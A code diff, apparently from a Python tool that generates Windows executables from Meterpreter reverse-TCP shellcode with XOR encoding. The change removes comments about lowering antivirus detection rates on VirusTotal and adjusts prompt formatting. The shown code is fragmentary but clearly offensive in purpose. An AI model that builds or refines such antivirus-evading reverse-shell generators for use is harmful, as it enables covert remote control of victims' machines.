@@ -8,10 +8,6 @@ from src.core.main import *
 from time import sleep
 from itertools import izip, cycle
 
-## Comments ##
-# This is still a work in progress currently only shell to exe works. at a 9/43 detection rate on VirusTotal
-# Looking to incorporate pyinstaller with wine, to get 0/43 detection rate. we will figure it out.
-
 def xor_string(data,key):
 	return "".join(chr(ord(x) ^ ord(y)) for (x,y) in izip(data, cycle(key)))
 	
@@ -39,7 +35,7 @@ while 1:
 		while selection != range(1,4):
 			clear()
 			menus.shellcode_menu()
-			selection = raw_input("%s Selection > %s" % (colours.bold, colours.reset))
+			selection = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 			if selection == '1':
 				payload = "windows/meterpreter/reverse_tcp"
 				break
@@ -49,7 +45,7 @@ while 1:
 
 		# shall we encode the payload?
 		menus.win_enc_menu()
-		encoding = raw_input("%s Selection > %s" % (colours.bold, colours.reset))
+		encoding = raw_input(" %sSelection > %s" % (colours.bold, colours.reset))
 
 		#			
 		# get some user info
@@ -109,7 +105,7 @@ while 1:
 			
 		# clean up
 		PrintInfo("Cleaning up...")
-		os.remove("output/template.c")
+		os.remove('output/template.c')
 			
 		# return to main
 		EntContinue()
